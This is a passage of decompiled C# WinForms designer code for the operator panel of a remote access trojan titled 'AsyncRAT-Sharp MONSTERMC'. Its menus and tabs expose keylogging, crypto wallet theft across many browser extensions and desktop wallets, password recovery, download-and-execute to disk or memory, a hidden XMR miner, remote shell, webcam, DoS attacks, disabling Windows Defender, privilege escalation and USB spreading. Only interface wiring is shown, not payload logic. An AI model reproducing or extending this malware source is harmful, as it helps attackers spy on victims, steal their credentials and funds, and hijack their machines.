            this.contextMenuThumbnail.Size = new System.Drawing.Size(106, 48);
            // 
            // sTARTToolStripMenuItem
            // 
            this.sTARTToolStripMenuItem.Name = "sTARTToolStripMenuItem";
            this.sTARTToolStripMenuItem.Size = new System.Drawing.Size(105, 22);
            this.sTARTToolStripMenuItem.Text = "START";
            this.sTARTToolStripMenuItem.Click += new System.EventHandler(this.STARTToolStripMenuItem_Click);
            // 
            // sTOPToolStripMenuItem
            // 
            this.sTOPToolStripMenuItem.Name = "sTOPToolStripMenuItem";
            this.sTOPToolStripMenuItem.Size = new System.Drawing.Size(105, 22);
            this.sTOPToolStripMenuItem.Text = "STOP";
            this.sTOPToolStripMenuItem.Click += new System.EventHandler(this.STOPToolStripMenuItem_Click);
            // 
            // ThumbnailImageList
            // 
            this.ThumbnailImageList.ColorDepth = System.Windows.Forms.ColorDepth.Depth16Bit;
            this.ThumbnailImageList.ImageSize = new System.Drawing.Size(256, 256);
            this.ThumbnailImageList.TransparentColor = System.Drawing.Color.Transparent;
            // 
            // tabPage4
            // 
            this.tabPage4.Controls.Add(this.listView4);
            this.tabPage4.Location = new System.Drawing.Point(4, 22);
            this.tabPage4.Margin = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.tabPage4.Name = "tabPage4";
            this.tabPage4.Padding = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.tabPage4.Size = new System.Drawing.Size(1275, 323);
            this.tabPage4.TabIndex = 3;
            this.tabPage4.Text = "Tasks";
            this.tabPage4.UseVisualStyleBackColor = true;
            // 
            // listView4
            // 
            this.listView4.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView4.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader4,
            this.columnHeader5});
            this.listView4.ContextMenuStrip = this.contextMenuTasks;
            this.listView4.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView4.FullRowSelect = true;
            this.listView4.HideSelection = false;
            this.listView4.Location = new System.Drawing.Point(2, 1);
            this.listView4.Margin = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.listView4.Name = "listView4";
            this.listView4.Size = new System.Drawing.Size(1271, 321);
            this.listView4.TabIndex = 0;
            this.listView4.UseCompatibleStateImageBehavior = false;
            this.listView4.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "Task";
            this.columnHeader4.Width = 97;
            // 
            // columnHeader5
            // 
            this.columnHeader5.Text = "Execution";
            this.columnHeader5.Width = 116;
            // 
            // contextMenuTasks
            // 
            this.contextMenuTasks.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.contextMenuTasks.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.gETLOGSToolStripMenuItem,
            this.walletsToolStripMenuItem1,
            this.pASSWORDRECOVERYToolStripMenuItem,
            this.downloadAndExecuteToolStripMenuItem,
            this.sENDFILETOMEMORYToolStripMenuItem1,
            this.minerToolStripMenuItem1,
            this.uPDATEToolStripMenuItem1,
            this.toolStripSeparator4,
            this.dELETETASKToolStripMenuItem});
            this.contextMenuTasks.Name = "contextMenuStrip4";
            this.contextMenuTasks.ShowImageMargin = false;
            this.contextMenuTasks.Size = new System.Drawing.Size(174, 186);
            // 
            // gETLOGSToolStripMenuItem
            // 
            this.gETLOGSToolStripMenuItem.Name = "gETLOGSToolStripMenuItem";
            this.gETLOGSToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.gETLOGSToolStripMenuItem.Text = "GET KEYLOGGER";
            this.gETLOGSToolStripMenuItem.Click += new System.EventHandler(this.gETLOGSToolStripMenuItem_Click);
            // 
            // walletsToolStripMenuItem1
            // 
            this.walletsToolStripMenuItem1.Name = "walletsToolStripMenuItem1";
            this.walletsToolStripMenuItem1.Size = new System.Drawing.Size(173, 22);
            this.walletsToolStripMenuItem1.Text = "WALLETS";
            this.walletsToolStripMenuItem1.Click += new System.EventHandler(this.walletsToolStripMenuItem1_Click);
            // 
            // pASSWORDRECOVERYToolStripMenuItem
            // 
            this.pASSWORDRECOVERYToolStripMenuItem.Name = "pASSWORDRECOVERYToolStripMenuItem";
            this.pASSWORDRECOVERYToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.pASSWORDRECOVERYToolStripMenuItem.Text = "PASSWORD RECOVERY";
            this.pASSWORDRECOVERYToolStripMenuItem.Click += new System.EventHandler(this.PASSWORDRECOVERYToolStripMenuItem_Click);
            // 
            // downloadAndExecuteToolStripMenuItem
            // 
            this.downloadAndExecuteToolStripMenuItem.Name = "downloadAndExecuteToolStripMenuItem";
            this.downloadAndExecuteToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.downloadAndExecuteToolStripMenuItem.Text = "SEND FILE TO DISK";
            this.downloadAndExecuteToolStripMenuItem.Click += new System.EventHandler(this.DownloadAndExecuteToolStripMenuItem_Click);
            // 
            // sENDFILETOMEMORYToolStripMenuItem1
            // 
            this.sENDFILETOMEMORYToolStripMenuItem1.Name = "sENDFILETOMEMORYToolStripMenuItem1";
            this.sENDFILETOMEMORYToolStripMenuItem1.Size = new System.Drawing.Size(173, 22);
            this.sENDFILETOMEMORYToolStripMenuItem1.Text = "SEND FILE TO MEMORY";
            this.sENDFILETOMEMORYToolStripMenuItem1.Click += new System.EventHandler(this.SENDFILETOMEMORYToolStripMenuItem1_Click);
            // 
            // minerToolStripMenuItem1
            // 
            this.minerToolStripMenuItem1.Name = "minerToolStripMenuItem1";
            this.minerToolStripMenuItem1.Size = new System.Drawing.Size(173, 22);
            this.minerToolStripMenuItem1.Text = "XMR MINER";
            this.minerToolStripMenuItem1.Visible = false;
            this.minerToolStripMenuItem1.Click += new System.EventHandler(this.MinerToolStripMenuItem1_Click);
            // 
            // uPDATEToolStripMenuItem1
            // 
            this.uPDATEToolStripMenuItem1.Name = "uPDATEToolStripMenuItem1";
            this.uPDATEToolStripMenuItem1.Size = new System.Drawing.Size(173, 22);
            this.uPDATEToolStripMenuItem1.Text = "UPDATE ALL CLIENTS";
            this.uPDATEToolStripMenuItem1.Click += new System.EventHandler(this.UPDATEToolStripMenuItem1_Click);
            // 
            // toolStripSeparator4
            // 
            this.toolStripSeparator4.Name = "toolStripSeparator4";
            this.toolStripSeparator4.Size = new System.Drawing.Size(170, 6);
            // 
            // dELETETASKToolStripMenuItem
            // 
            this.dELETETASKToolStripMenuItem.Name = "dELETETASKToolStripMenuItem";
            this.dELETETASKToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.dELETETASKToolStripMenuItem.Text = "DELETE TASK";
            this.dELETETASKToolStripMenuItem.Click += new System.EventHandler(this.DELETETASKToolStripMenuItem_Click);
            // 
            // tabPage5
            // 
            this.tabPage5.Controls.Add(this.listBox1);
            this.tabPage5.Location = new System.Drawing.Point(4, 22);
            this.tabPage5.Name = "tabPage5";
            this.tabPage5.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage5.Size = new System.Drawing.Size(1275, 323);
            this.tabPage5.TabIndex = 4;
            this.tabPage5.Text = "Sites Log";
            this.tabPage5.UseVisualStyleBackColor = true;
            // 
            // listBox1
            // 
            this.listBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listBox1.ContextMenuStrip = this.contextMenuStrip1;
            this.listBox1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listBox1.Font = new System.Drawing.Font("Tahoma", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.listBox1.ForeColor = System.Drawing.Color.DarkSlateBlue;
            this.listBox1.FormattingEnabled = true;
            this.listBox1.HorizontalScrollbar = true;
            this.listBox1.ItemHeight = 16;
            this.listBox1.Location = new System.Drawing.Point(3, 3);
            this.listBox1.Name = "listBox1";
            this.listBox1.Size = new System.Drawing.Size(1269, 317);
            this.listBox1.TabIndex = 0;
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.gOTOToolStripMenuItem,
            this.desktopToolStripMenuItem,
            this.cLEARToolStripMenuItem1,
            this.toolStripSeparator7,
            this.settingsToolStripMenuItem});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new System.Drawing.Size(125, 98);
            // 
            // gOTOToolStripMenuItem
            // 
            this.gOTOToolStripMenuItem.Name = "gOTOToolStripMenuItem";
            this.gOTOToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.gOTOToolStripMenuItem.Text = "GOTO";
            this.gOTOToolStripMenuItem.Click += new System.EventHandler(this.gOTOToolStripMenuItem_Click);
            // 
            // desktopToolStripMenuItem
            // 
            this.desktopToolStripMenuItem.Name = "desktopToolStripMenuItem";
            this.desktopToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.desktopToolStripMenuItem.Text = "SCREEN";
            this.desktopToolStripMenuItem.Click += new System.EventHandler(this.desktopToolStripMenuItem_Click);
            // 
            // cLEARToolStripMenuItem1
            // 
            this.cLEARToolStripMenuItem1.Name = "cLEARToolStripMenuItem1";
            this.cLEARToolStripMenuItem1.Size = new System.Drawing.Size(124, 22);
            this.cLEARToolStripMenuItem1.Text = "CLEAR";
            this.cLEARToolStripMenuItem1.Click += new System.EventHandler(this.cLEARToolStripMenuItem1_Click);
            // 
            // toolStripSeparator7
            // 
            this.toolStripSeparator7.Name = "toolStripSeparator7";
            this.toolStripSeparator7.Size = new System.Drawing.Size(121, 6);
            // 
            // settingsToolStripMenuItem
            // 
            this.settingsToolStripMenuItem.Name = "settingsToolStripMenuItem";
            this.settingsToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.settingsToolStripMenuItem.Text = "SETTINGS";
            this.settingsToolStripMenuItem.Click += new System.EventHandler(this.settingsToolStripMenuItem_Click);
            // 
            // tabPage6
            // 
            this.tabPage6.Controls.Add(this.listView5);
            this.tabPage6.Location = new System.Drawing.Point(4, 22);
            this.tabPage6.Name = "tabPage6";
            this.tabPage6.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage6.Size = new System.Drawing.Size(1275, 323);
            this.tabPage6.TabIndex = 5;
            this.tabPage6.Text = "Wallets";
            this.tabPage6.UseVisualStyleBackColor = true;
            // 
            // listView5
            // 
            this.listView5.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView5.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader3,
            this.columnHeader6,
            this.columnHeader7,
            this.columnHeader8,
            this.columnHeader9,
            this.columnHeader10,
            this.columnHeader11,
            this.columnHeader12,
            this.columnHeader13,
            this.columnHeader14,
            this.columnHeader15,
            this.columnHeader16,
            this.columnHeader17,
            this.columnHeader18,
            this.columnHeader19,
            this.columnHeader20,
            this.columnHeader21,
            this.columnHeader22,
            this.columnHeader23,
            this.columnHeader24,
            this.columnHeader25,
            this.columnHeader26,
            this.columnHeader27,
            this.columnHeader28,
            this.columnHeader29,
            this.columnHeader30,
            this.columnHeader31,
            this.columnHeader32,
            this.columnHeader33});
            this.listView5.ContextMenuStrip = this.contextMenuStrip2;
            this.listView5.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView5.FullRowSelect = true;
            this.listView5.GridLines = true;
            this.listView5.HideSelection = false;
            this.listView5.Location = new System.Drawing.Point(3, 3);
            this.listView5.Margin = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.listView5.MultiSelect = false;
            this.listView5.Name = "listView5";
            this.listView5.ShowGroups = false;
            this.listView5.ShowItemToolTips = true;
            this.listView5.Size = new System.Drawing.Size(1269, 317);
            this.listView5.SmallImageList = this.imageList2;
            this.listView5.TabIndex = 1;
            this.listView5.UseCompatibleStateImageBehavior = false;
            this.listView5.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "HWID";
            this.columnHeader3.Width = 217;
            // 
            // columnHeader6
            // 
            this.columnHeader6.Text = "Name";
            this.columnHeader6.Width = 183;
            // 
            // columnHeader7
            // 
            this.columnHeader7.Text = "MetaFireFox";
            this.columnHeader7.Width = 80;
            // 
            // columnHeader8
            // 
            this.columnHeader8.Text = "MetaChrome";
            this.columnHeader8.Width = 78;
            // 
            // columnHeader9
            // 
            this.columnHeader9.Text = "MetaEdge";
            this.columnHeader9.Width = 80;
            // 
            // columnHeader10
            // 
            this.columnHeader10.Text = "MetaBrave";
            this.columnHeader10.Width = 78;
            // 
            // columnHeader11
            // 
            this.columnHeader11.Text = "MetaOpera";
            this.columnHeader11.Width = 78;
            // 
            // columnHeader12
            // 
            this.columnHeader12.Text = "MetaOperaGX";
            this.columnHeader12.Width = 88;
            // 
            // columnHeader13
            // 
            this.columnHeader13.Text = "PhantomChrome";
            this.columnHeader13.Width = 96;
            // 
            // columnHeader14
            // 
            this.columnHeader14.Text = "PhantomBrave";
            this.columnHeader14.Width = 96;
            // 
            // columnHeader15
            // 
            this.columnHeader15.Text = "BinanceChrome";
            this.columnHeader15.Width = 95;
            // 
            // columnHeader16
            // 
            this.columnHeader16.Text = "BinanceEdge";
            this.columnHeader16.Width = 95;
            // 
            // columnHeader17
            // 
            this.columnHeader17.Text = "TronLinkChrome";
            this.columnHeader17.Width = 95;
            // 
            // columnHeader18
            // 
            this.columnHeader18.Text = "BitKeepChrome";
            this.columnHeader18.Width = 95;
            // 
            // columnHeader19
            // 
            this.columnHeader19.Text = "CoinbaseChrome";
            this.columnHeader19.Width = 95;
            // 
            // columnHeader20
            // 
            this.columnHeader20.Text = "RoninChrome";
            this.columnHeader20.Width = 95;
            // 
            // columnHeader21
            // 
            this.columnHeader21.Text = "TrustChrome";
            this.columnHeader21.Width = 95;
            // 
            // columnHeader22
            // 
            this.columnHeader22.Text = "BitPayChrome";
            this.columnHeader22.Width = 95;
            // 
            // columnHeader23
            // 
            this.columnHeader23.Text = "F2aChrome";
            this.columnHeader23.Width = 80;
            // 
            // columnHeader24
            // 
            this.columnHeader24.Text = "F2aEdge";
            this.columnHeader24.Width = 80;
            // 
            // columnHeader25
            // 
            this.columnHeader25.Text = "F2aBrave";
            this.columnHeader25.Width = 80;
            // 
            // columnHeader26
            // 
            this.columnHeader26.Text = "RabbyWallet";
            this.columnHeader26.Width = 80;
            // 
            // columnHeader27
            // 
            this.columnHeader27.Text = "Ledger Live";
            this.columnHeader27.Width = 80;
            // 
            // columnHeader28
            // 
            this.columnHeader28.Text = "Atomic";
            // 
            // columnHeader29
            // 
            this.columnHeader29.Text = "Exodus";
            // 
            // columnHeader30
            // 
            this.columnHeader30.Text = "Electrum";
            this.columnHeader30.Width = 80;
            // 
            // columnHeader31
            // 
            this.columnHeader31.Text = "Coinomi";
            this.columnHeader31.Width = 80;
            // 
            // columnHeader32
            // 
            this.columnHeader32.Text = "Binance";
            this.columnHeader32.Width = 80;
            // 
            // columnHeader33
            // 
            this.columnHeader33.Text = "Bitcoin Core";
            this.columnHeader33.Width = 80;
            // 
            // contextMenuStrip2
            // 
            this.contextMenuStrip2.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.contextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.searchHWIDToolStripMenuItem,
            this.copyIDToolStripMenuItem,
            this.gOTOToolStripMenuItem1,
            this.toolStripSeparator3,
            this.clearToolStripMenuItem2});
            this.contextMenuStrip2.Name = "contextMenuStrip2";
            this.contextMenuStrip2.Size = new System.Drawing.Size(144, 98);
            // 
            // searchHWIDToolStripMenuItem
            // 
            this.searchHWIDToolStripMenuItem.Name = "searchHWIDToolStripMenuItem";
            this.searchHWIDToolStripMenuItem.Size = new System.Drawing.Size(143, 22);
            this.searchHWIDToolStripMenuItem.Text = "Search HWID";
            this.searchHWIDToolStripMenuItem.Click += new System.EventHandler(this.searchHWIDToolStripMenuItem_Click_1);
            // 
            // copyIDToolStripMenuItem
            // 
            this.copyIDToolStripMenuItem.Name = "copyIDToolStripMenuItem";
            this.copyIDToolStripMenuItem.Size = new System.Drawing.Size(143, 22);
            this.copyIDToolStripMenuItem.Text = "COPY";
            this.copyIDToolStripMenuItem.Click += new System.EventHandler(this.copyIDToolStripMenuItem_Click);
            // 
            // gOTOToolStripMenuItem1
            // 
            this.gOTOToolStripMenuItem1.Name = "gOTOToolStripMenuItem1";
            this.gOTOToolStripMenuItem1.Size = new System.Drawing.Size(143, 22);
            this.gOTOToolStripMenuItem1.Text = "GOTO";
            this.gOTOToolStripMenuItem1.Click += new System.EventHandler(this.gOTOToolStripMenuItem1_Click);
            // 
            // toolStripSeparator3
            // 
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new System.Drawing.Size(140, 6);
            // 
            // clearToolStripMenuItem2
            // 
            this.clearToolStripMenuItem2.Name = "clearToolStripMenuItem2";
            this.clearToolStripMenuItem2.Size = new System.Drawing.Size(143, 22);
            this.clearToolStripMenuItem2.Text = "CLEAR";
            this.clearToolStripMenuItem2.Click += new System.EventHandler(this.clearToolStripMenuItem2_Click);
            // 
            // imageList2
            // 
            this.imageList2.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit;
            this.imageList2.ImageSize = new System.Drawing.Size(16, 16);
            this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
            // 
            // performanceCounter1
            // 
            this.performanceCounter1.CategoryName = "Processor";
            this.performanceCounter1.CounterName = "% Processor Time";
            this.performanceCounter1.InstanceName = "_Total";
            // 
            // performanceCounter2
            // 
            this.performanceCounter2.CategoryName = "Memory";
            this.performanceCounter2.CounterName = "% Committed Bytes In Use";
            // 
            // notifyIcon1
            // 
            this.notifyIcon1.Text = "AsyncRAT";
            this.notifyIcon1.Visible = true;
            // 
            // TimerTask
            // 
            this.TimerTask.Enabled = true;
            this.TimerTask.Interval = 5000;
            this.TimerTask.Tick += new System.EventHandler(this.TimerTask_Tick);
            // 
            // imageList1
            // 
            this.imageList1.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit;
            this.imageList1.ImageSize = new System.Drawing.Size(16, 16);
            this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 3000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1283, 371);
            this.Controls.Add(this.tabControl1);
            this.Controls.Add(this.statusStrip1);
            this.Margin = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "AsyncRAT-Sharp MONSTERMC";
            this.Activated += new System.EventHandler(this.Form1_Activated);
            this.Deactivate += new System.EventHandler(this.Form1_Deactivate);
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.contextMenuClient.ResumeLayout(false);
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.tabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.tabPage2.ResumeLayout(false);
            this.contextMenuLogs.ResumeLayout(false);
            this.tabPage3.ResumeLayout(false);
            this.contextMenuThumbnail.ResumeLayout(false);
            this.tabPage4.ResumeLayout(false);
            this.contextMenuTasks.ResumeLayout(false);
            this.tabPage5.ResumeLayout(false);
            this.contextMenuStrip1.ResumeLayout(false);
            this.tabPage6.ResumeLayout(false);
            this.contextMenuStrip2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter2)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

		}

		// Token: 0x0400005E RID: 94
		private global::System.ComponentModel.IContainer components;

		// Token: 0x0400005F RID: 95
		public global::System.Windows.Forms.ListView listView1;

		// Token: 0x04000060 RID: 96
		private global::System.Windows.Forms.ColumnHeader lv_ip;

		// Token: 0x04000061 RID: 97
		private global::System.Windows.Forms.ContextMenuStrip contextMenuClient;

		// Token: 0x04000062 RID: 98
		private global::System.Windows.Forms.StatusStrip statusStrip1;

		// Token: 0x04000063 RID: 99
		private global::System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel1;

		// Token: 0x04000064 RID: 100
		private global::System.Windows.Forms.Timer ping;

		// Token: 0x04000065 RID: 101
		private global::System.Windows.Forms.Timer UpdateUI;

		// Token: 0x04000066 RID: 102
		private global::System.Windows.Forms.ToolStripMenuItem sENDFILEToolStripMenuItem;

		// Token: 0x04000067 RID: 103
		public global::System.Windows.Forms.ColumnHeader lv_hwid;

		// Token: 0x04000068 RID: 104
		private global::System.Windows.Forms.ColumnHeader lv_country;

		// Token: 0x04000069 RID: 105
		private global::System.Windows.Forms.ToolStripMenuItem bUILDERToolStripMenuItem;

		// Token: 0x0400006A RID: 106
		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator2;

		// Token: 0x0400006B RID: 107
		private global::System.Windows.Forms.TabControl tabControl1;

		// Token: 0x0400006C RID: 108
		private global::System.Windows.Forms.TabPage tabPage1;

		// Token: 0x0400006D RID: 109
		private global::System.Windows.Forms.TabPage tabPage2;

		// Token: 0x0400006E RID: 110
		public global::System.Windows.Forms.ListView listView2;

		// Token: 0x0400006F RID: 111
		private global::System.Windows.Forms.ColumnHeader columnHeader1;

		// Token: 0x04000070 RID: 112
		private global::System.Windows.Forms.ColumnHeader columnHeader2;

		// Token: 0x04000071 RID: 113
		private global::System.Diagnostics.PerformanceCounter performanceCounter1;

		// Token: 0x04000072 RID: 114
		private global::System.Diagnostics.PerformanceCounter performanceCounter2;

		// Token: 0x04000073 RID: 115
		private global::System.Windows.Forms.ToolStripMenuItem aBOUTToolStripMenuItem;

		// Token: 0x04000074 RID: 116
		private global::System.Windows.Forms.TabPage tabPage3;

		// Token: 0x04000075 RID: 117
		private global::System.Windows.Forms.ContextMenuStrip contextMenuThumbnail;

		// Token: 0x04000076 RID: 118
		private global::System.Windows.Forms.ToolStripMenuItem sTARTToolStripMenuItem;

		// Token: 0x04000077 RID: 119
		private global::System.Windows.Forms.ToolStripMenuItem sTOPToolStripMenuItem;

		// Token: 0x04000078 RID: 120
		public global::System.Windows.Forms.ImageList ThumbnailImageList;

		// Token: 0x04000079 RID: 121
		public global::System.Windows.Forms.ListView listView3;

		// Token: 0x0400007A RID: 122
		public global::System.Windows.Forms.NotifyIcon notifyIcon1;

		// Token: 0x0400007B RID: 123
		private global::System.Windows.Forms.ColumnHeader lv_admin;

		// Token: 0x0400007C RID: 124
		private global::System.Windows.Forms.TabPage tabPage4;

		// Token: 0x0400007D RID: 125
		private global::System.Windows.Forms.ColumnHeader columnHeader4;

		// Token: 0x0400007E RID: 126
		private global::System.Windows.Forms.ColumnHeader columnHeader5;

		// Token: 0x0400007F RID: 127
		private global::System.Windows.Forms.ContextMenuStrip contextMenuTasks;

		// Token: 0x04000080 RID: 128
		private global::System.Windows.Forms.ToolStripMenuItem downloadAndExecuteToolStripMenuItem;

		// Token: 0x04000081 RID: 129
		public global::System.Windows.Forms.ListView listView4;

		// Token: 0x04000082 RID: 130
		private global::System.Windows.Forms.ToolStripMenuItem sENDFILETOMEMORYToolStripMenuItem1;

		// Token: 0x04000083 RID: 131
		private global::System.Windows.Forms.ToolStripMenuItem uPDATEToolStripMenuItem1;

		// Token: 0x04000084 RID: 132
		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator4;

		// Token: 0x04000085 RID: 133
		private global::System.Windows.Forms.ToolStripMenuItem dELETETASKToolStripMenuItem;

		// Token: 0x04000086 RID: 134
		private global::System.Windows.Forms.Timer TimerTask;

		// Token: 0x04000087 RID: 135
		private global::System.Windows.Forms.ToolStripMenuItem tOMEMORYToolStripMenuItem;

		// Token: 0x04000088 RID: 136
		private global::System.Windows.Forms.ToolStripMenuItem tODISKToolStripMenuItem;

		// Token: 0x04000089 RID: 137
		private global::System.Windows.Forms.ContextMenuStrip contextMenuLogs;

		// Token: 0x0400008A RID: 138
		private global::System.Windows.Forms.ToolStripMenuItem cLEARToolStripMenuItem;

		// Token: 0x0400008B RID: 139
		private global::System.Windows.Forms.ToolStripMenuItem monitoringToolStripMenuItem;

		// Token: 0x0400008C RID: 140
		private global::System.Windows.Forms.ToolStripMenuItem keyloggerToolStripMenuItem1;

		// Token: 0x0400008D RID: 141
		private global::System.Windows.Forms.ToolStripMenuItem processManagerToolStripMenuItem1;

		// Token: 0x0400008E RID: 142
		private global::System.Windows.Forms.ToolStripMenuItem reportWindowToolStripMenuItem;

		// Token: 0x0400008F RID: 143
		private global::System.Windows.Forms.ToolStripMenuItem miscellaneousToolStripMenuItem;

		// Token: 0x04000090 RID: 144
		private global::System.Windows.Forms.ToolStripMenuItem botsKillerToolStripMenuItem;

		// Token: 0x04000091 RID: 145
		private global::System.Windows.Forms.ToolStripMenuItem uSBSpreadToolStripMenuItem1;

		// Token: 0x04000092 RID: 146
		private global::System.Windows.Forms.ToolStripMenuItem extraToolStripMenuItem;

		// Token: 0x04000093 RID: 147
		private global::System.Windows.Forms.ToolStripMenuItem visitWebsiteToolStripMenuItem1;

		// Token: 0x04000094 RID: 148
		private global::System.Windows.Forms.ToolStripMenuItem sendMessageBoxToolStripMenuItem1;

		// Token: 0x04000095 RID: 149
		private global::System.Windows.Forms.ToolStripMenuItem chatToolStripMenuItem1;

		// Token: 0x04000096 RID: 150
		private global::System.Windows.Forms.ToolStripMenuItem runToolStripMenuItem1;

		// Token: 0x04000097 RID: 151
		private global::System.Windows.Forms.ToolStripMenuItem stopToolStripMenuItem2;

		// Token: 0x04000098 RID: 152
		private global::System.Windows.Forms.ToolStripMenuItem systemToolStripMenuItem;

		// Token: 0x04000099 RID: 153
		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem_0;

		// Token: 0x0400009A RID: 154
		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator1;

		// Token: 0x0400009B RID: 155
		private global::System.Windows.Forms.ToolStripMenuItem seedTorrentToolStripMenuItem1;

		// Token: 0x0400009C RID: 156
		private global::System.Windows.Forms.ToolStripMenuItem remoteShellToolStripMenuItem1;

		// Token: 0x0400009D RID: 157
		private global::System.Windows.Forms.ToolStripMenuItem dOSAttackToolStripMenuItem;

		// Token: 0x0400009E RID: 158
		private global::System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel2;

		// Token: 0x0400009F RID: 159
		private global::System.Windows.Forms.ToolStripMenuItem executeNETCodeToolStripMenuItem;

		// Token: 0x040000A0 RID: 160
		private global::System.Windows.Forms.ToolStripMenuItem pASSWORDRECOVERYToolStripMenuItem;

		// Token: 0x040000A1 RID: 161
		private global::System.Windows.Forms.ToolStripMenuItem blankScreenToolStripMenuItem;

		// Token: 0x040000A2 RID: 162
		private global::System.Windows.Forms.ToolStripMenuItem getAdminPrivilegesToolStripMenuItem;

		// Token: 0x040000A3 RID: 163
		private global::System.Windows.Forms.ToolStripMenuItem disableWindowsDefenderToolStripMenuItem;

		// Token: 0x040000A4 RID: 164
		private global::System.Windows.Forms.ToolStripMenuItem webcamToolStripMenuItem;

		// Token: 0x040000A5 RID: 165
		private global::System.Windows.Forms.ToolStripMenuItem xMRMinerToolStripMenuItem;

		// Token: 0x040000A6 RID: 166
		private global::System.Windows.Forms.ToolStripMenuItem runToolStripMenuItem;

		// Token: 0x040000A7 RID: 167
		private global::System.Windows.Forms.ToolStripMenuItem killToolStripMenuItem;

		// Token: 0x040000A8 RID: 168
		private global::System.Windows.Forms.ToolStripMenuItem serverToolStripMenuItem;

		// Token: 0x040000A9 RID: 169
		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator5;

		// Token: 0x040000AA RID: 170
		private global::System.Windows.Forms.ToolStripMenuItem blockClientsToolStripMenuItem;

		// Token: 0x040000AB RID: 171
		private global::System.Windows.Forms.ToolStripMenuItem minerToolStripMenuItem1;

		// Token: 0x040000AC RID: 172
		private global::System.Windows.Forms.ToolStripMenuItem runToolStripMenuItem2;

		// Token: 0x040000AD RID: 173
		private global::System.Windows.Forms.ToolStripMenuItem stopToolStripMenuItem1;

		// Token: 0x040000AE RID: 174
		private global::System.Windows.Forms.ToolStripMenuItem setWallpaperToolStripMenuItem;

		// Token: 0x040000AF RID: 175
		private global::System.Windows.Forms.ToolStripMenuItem filesSearcherToolStripMenuItem;

		// Token: 0x040000B0 RID: 176
		private global::System.Windows.Forms.ColumnHeader lv_group;

		// Token: 0x040000B1 RID: 177
		private global::System.Windows.Forms.ToolStripMenuItem clientToolStripMenuItem;

		// Token: 0x040000B2 RID: 178
		private global::System.Windows.Forms.ToolStripMenuItem closeToolStripMenuItem1;

		// Token: 0x040000B3 RID: 179
		private global::System.Windows.Forms.ToolStripMenuItem restartToolStripMenuItem2;

		// Token: 0x040000B4 RID: 180
		private global::System.Windows.Forms.ToolStripMenuItem updateToolStripMenuItem2;

		// Token: 0x040000B5 RID: 181
		private global::System.Windows.Forms.ToolStripMenuItem uninstallToolStripMenuItem;

		// Token: 0x040000B6 RID: 182
		private global::System.Windows.Forms.ToolStripMenuItem logoffToolStripMenuItem1;

		// Token: 0x040000B7 RID: 183
		private global::System.Windows.Forms.ToolStripMenuItem restartToolStripMenuItem3;

		// Token: 0x040000B8 RID: 184
		private global::System.Windows.Forms.ToolStripMenuItem shutdownToolStripMenuItem1;

		// Token: 0x040000B9 RID: 185
		private global::System.Windows.Forms.ColumnHeader lv_name;

		// Token: 0x040000BA RID: 186
		private global::System.Windows.Forms.ToolStripMenuItem renameToolStripMenuItem;

		// Token: 0x040000BB RID: 187
